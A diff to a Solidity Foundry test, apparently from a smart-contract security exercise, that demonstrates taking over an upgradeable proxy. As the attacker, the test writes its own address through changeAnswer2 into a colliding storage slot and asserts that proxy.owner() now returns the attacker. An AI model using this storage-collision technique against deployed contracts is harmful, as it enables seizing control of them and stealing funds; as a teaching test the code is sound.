@@ -36,14 +36,18 @@ contract AnswerProxyTest is NomiconTest {
         assert(address(implementationAddress) == address(answers));
         console.log(implementationAddress, address(answers));
 
+        // Hack the proxy
         vm.startPrank(attacker);
 
-        address(proxy).call(abi.encodeWithSignature("changeAnswer2(uint256)", uint256(uint160(attacker))));
+        (bool success,) =
+            address(proxy).call(abi.encodeWithSignature("changeAnswer2(uint256)", uint256(uint160(attacker))));
+        require(success, "Attack failed");
 
         (, bytes memory attackerData) = address(proxy).call(abi.encodeWithSignature("getAnswer2()"));
+        address proxyOwner = proxy.owner();
         address attackerAddress = address(uint160(uint256(bytes32(attackerData))));
-        assert(address(attacker) == address(attackerAddress));
-        console.log(attacker, attackerAddress);
+        assert(proxyOwner == address(attackerAddress));
+        console.log(proxyOwner, attackerAddress);
 
         vm.stopPrank();
     }
